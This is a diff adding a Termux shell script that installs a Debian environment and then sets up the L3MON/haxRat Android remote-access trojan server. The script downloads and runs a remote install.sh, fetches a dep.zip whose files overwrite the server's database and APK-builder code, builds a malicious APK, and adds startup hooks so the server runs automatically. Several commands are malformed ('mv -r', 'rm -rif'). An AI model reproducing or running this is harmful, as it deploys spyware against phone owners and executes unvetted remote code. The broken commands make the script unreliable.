@@ -1,0 +1,52 @@
+apt-get update;\
+curl --silent --location --remote-name https://raw.githubusercontent.com/trungtai33/debian-bullseye-in-termux/master/install.sh;\
+bash install.sh;\
+rm install.sh;\
+echo "start-debian-bullseye > /dev/null 2>&1 & termux-open-url http://localhost:22533" >> $PREFIX/bin/lemon;\
+chmod +x $PREFIX/bin/lemon;\
+echo "bash $HOME/setup.txt;exit" >> $PREFIX/share/debian-bullseye/etc/bash.bashrc;\
+
+cat <<'EOF' > $PREFIX/share/debian-bullseye/root/setup.txt
+apt-get update;\
+apt-get install git -y;\
+apt-get install curl -y;\
+apt-get install wget -y;\
+apt-get install zip -y;\
+apt-get install josm -y;\
+apt-get install android-framework-res -y;\
+sed -i '' -e '$ d' /etc/bash.bashrc;\
+echo "node /root/l3mon/server/index.js" >> $PREFIX/etc/bash.bashrc;\
+git clone https://github.com/hax4us/haxRat.git;\
+mv haxRat l3mon;\
+wget -O dep.zip https://github.com/papaveroideae/l3mon/blob/main/dep.zip?raw=true;\
+unzip dep.zip;\
+rm dep.zip;\
+mv $HOME/dep/apktool $PREFIX/bin;\
+cd $PREFIX/usr/share;\
+mv -r $HOME/dep/apktools $PREFIX/usr/share;\
+mv -r $HOME/dep/android-framework-res $PREFIX/usr/share;\ 
+mv $PREFIX/usr/share/apktools apktool;\
+chmod +x $PREFIX/bin/apktool;\
+cat $HOME/dep/maindb.txt > $HOME/l3mon/server/maindb.json;\
+cat $HOME/dep/apkBuilder.txt > $HOME/l3mon/server/includes/apkBuilder.js;\
+cat $HOME/dep/const.txt > $HOME/l3mon/server/includes/const.js;\
+rm -rif $HOME/l3mon/server/assets;\
+cp -r $HOME/dep/assets $HOME/l3mon/server;\
+rm -rif $HOME/dep;\
+cd $HOME/l3mon/server;\
+echo "deb http://security.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list;\
+apt-get update;\
+apt-get install openjdk-8-jdk -y;\
+update-alternatives --config java;\
+apt-get install zipalign -y;\
+apt-get install npm -y;\
+apt-get install nodejs -y;\
+apt-get install aapt -y;\
+npm -g install npm@7.11.1;\
+npm install;\
+apktool b "/root/l3mon/server/app/factory/decompiled" -o "/root/l3mon/server/assets/webpublic/build.apk";\
+rm $HOME/setup.txt;\
+exit
+EOF
+
+start-debian-bullseye
